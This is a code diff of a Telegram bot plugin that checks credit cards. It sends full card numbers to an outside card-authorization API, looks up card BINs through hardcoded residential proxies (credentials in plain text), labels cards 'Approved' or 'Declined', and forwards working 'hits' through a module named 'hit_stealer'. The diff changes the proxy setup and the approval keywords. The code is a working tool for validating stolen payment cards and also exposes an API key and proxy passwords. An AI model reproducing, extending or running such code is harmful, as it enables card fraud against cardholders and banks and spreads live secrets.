@@ -1,15 +1,13 @@
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ChatType
-import re, time, httpx, requests
-from httpx_socks import AsyncProxyTransport
+import re, time, requests, httpx
 from plugins.func.users_sql import *
 from plugins.tools.hit_stealer import send_hit_if_approved
 from datetime import date
 
 API_URL = "https://barryxapi.xyz/str_auth"
 API_KEY = "BRY-HEIQ7-KPWYR-DRU67"
-
 session = requests.Session()
 
 @Client.on_message(filters.command("cc", prefixes=["/", "."]))
@@ -72,9 +70,7 @@ async def cmd_cc(Client, message):
 
         tic = time.perf_counter()
         try:
-            proxy_url = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
-            transport = AsyncProxyTransport.from_url(proxy_url)
-            async with httpx.AsyncClient(transport=transport, timeout=25) as client:
+            async with httpx.AsyncClient(timeout=25) as client:
                 res = await client.get(f"{API_URL}?key={API_KEY}&card={fullcc}")
                 if res.status_code == 200:
                     data = res.json()
@@ -89,25 +85,27 @@ async def cmd_cc(Client, message):
 
         toc = time.perf_counter()
 
+        # BIN Lookup with proxy fallback
         try:
+            proxy = "http://1bbbfe33e5a9-res-any:wkA8oqCZSeSaVoA@residential.resi.gg:5959"
             headers = {"User-Agent": "Mozilla/5.0"}
-            proxies = {
-                "http": proxy_url,
-                "https": proxy_url
-            }
-            binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", headers=headers, proxies=proxies, timeout=15).json()
+            proxies = {"http": proxy, "https": proxy}
+            try:
+                binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", headers=headers, proxies=proxies, timeout=10).json()
+            except:
+                binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", headers=headers, timeout=10).json()
             brand = str(binres.get("brand") or binres.get("scheme") or "N/A").upper()
             type_ = str(binres.get("type", "N/A")).upper()
             level = str(binres.get("level", "N/A")).upper()
             bank = str(binres.get("bank", "N/A")).upper()
             country = str(binres.get("country_name", "N/A")).upper()
             flag = binres.get("country_flag") or "🏳️"
-        except Exception as e:
+        except:
             brand = type_ = level = bank = country = "N/A"
             flag = "🏳️"
 
         msg_lower = card_message.lower()
-        if any(k in msg_lower for k in ["approved", "success", "charged",  "insufficient_funds", "incorrect_cvc"]):
+        if any(k in msg_lower for k in ["approved", "success", "charged", "card added", "insufficient_funds", "incorrect_cvc"]):
             status = "Approved ✅"
         elif any(k in msg_lower for k in ["declined", "pickup", "fraud", "stolen", "lost", "do not honor"]):
             status = "Declined ❌"
@@ -128,7 +126,7 @@ async def cmd_cc(Client, message):
 <b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
 """
 
-        await Client.edit_message_text(chat_id, check_msg.id, final_msg)
+        await Client.edit_message_text(chat_id, check_msg.id, text=final_msg)
 
         if "approved" in status.lower() or "live" in card_message.lower():
             await send_hit_if_approved(Client, final_msg)
